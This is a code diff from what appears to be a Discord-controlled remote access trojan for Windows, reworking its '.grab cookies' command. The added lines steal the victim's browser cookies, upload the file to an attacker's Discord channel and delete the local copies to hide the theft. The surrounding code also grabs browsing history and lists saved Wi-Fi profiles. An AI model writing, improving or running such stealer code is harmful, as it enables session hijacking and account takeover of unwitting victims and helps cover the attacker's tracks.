@@ -9,14 +9,6 @@ import subprocess
 import os
 # end of imports
 
-# !cookies_submit
-if os.path.exists(f'C:\\Users\\{getuser()}\\ready.cookies') and cookies_thread != None:
-    await asyncio.sleep(1)
-    reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
-    subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
-    subprocess.run(f'del C:\\Users\\{getuser()}\\ready.cookies', shell=True)
-    cookies_thread = None
-
 # on message
 elif message.content[:5] == '.grab':
     await message.delete()
@@ -38,12 +30,13 @@ elif message.content[:5] == '.grab':
             subprocess.run('del history.txt', shell=True)
         
         elif message.content[6:] == 'cookies':
-            if cookies_thread == None:
-                cookies_thread = Thread(target=grab_cookies); cookies_thread.start()
-                await message.channel.send('```Grabbing cookies. Please wait...```')
-            else:
-                reaction_msg = await message.channel.send('``Cookies are being collected. Please be patient...``'); await reaction_msg.add_reaction('🔴')
-
+            grab_cookies()
+            await message.channel.send('```Grabbing cookies. Please wait...```')
+            await asyncio.sleep(1)
+            reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
+            subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
+            subprocess.run(f'del C:\\Users\\{getuser()}\\tmp', shell=True)
+            
         elif message.content[6:].lower() == 'wifi':
             networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
             polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
